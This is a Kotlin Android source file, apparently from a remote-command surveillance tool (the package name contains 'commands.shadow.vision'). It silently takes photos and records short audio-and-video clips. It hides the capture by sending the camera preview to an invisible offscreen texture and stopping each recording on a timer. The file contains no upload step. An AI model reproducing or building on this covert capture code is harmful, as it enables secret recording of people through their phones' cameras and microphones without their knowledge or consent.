package com.hc.calling.commands.shadow.vision.camera

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.media.MediaRecorder
import android.view.Surface
import com.hc.calling.commands.shadow.vision.Recorder
import io.reactivex.Observable
import java.io.BufferedOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

/**
 * Created by ChanHong on 2019/4/10
 *
 */
class Camera1Control(context: Context) : Recorder(context) {
    override fun takePhoto(completed: (filePath: String) -> Unit) {
        super.takePhoto(completed)
        Camera.open(mCamera!!.toInt()).apply {
            setPreviewTexture(SurfaceTexture(0))
            startPreview()
            takePicture(null, null) { data, camera ->
                BufferedOutputStream(FileOutputStream(File(mFilePath))).apply {
                    write(data)
                    flush()
                    camera.stopPreview()
                    camera.release()
                    completed(mFilePath!!)
                }
            }
        }

    }

    override fun initMediaRecorder(completed: () -> Unit) {
        mMediaRecorder.apply {
            setAudioSource(MediaRecorder.AudioSource.CAMCORDER)//摄录像机
            setVideoSource(mCamera!!.toInt())//相机

            // Set output file format
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)//输出格式 mp4

            // 这两项需要放在setOutputFormat之后  设置编码器
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)//音频编码格式
            setVideoEncoder(MediaRecorder.VideoEncoder.MPEG_4_SP)//视频编码格式

            setVideoSize(640, 480)//视频分辨率
            setVideoFrameRate(30)//帧速率
            setVideoEncodingBitRate(3 * 1024 * 1024)//视频清晰度
            setOrientationHint(90)//输出视频播放的方向提示
            //设置记录会话的最大持续时间（毫秒）
            setMaxDuration(30 * 1000)
            setPreviewDisplay(Surface(SurfaceTexture(0)))//预览显示的控件

            setOutputFile(mFilePath)
            prepare()
            completed()
        }

    }


    @SuppressLint("CheckResult")
    override fun record(completed: (filePath: String) -> Unit) {
        super.record()
        mMediaRecorder.apply {
            start()
        }

        Observable.timer(10, TimeUnit.SECONDS).subscribe {
            mMediaRecorder.stop()
            mMediaRecorder.release()
            completed(mFilePath!!)
        }

    }

}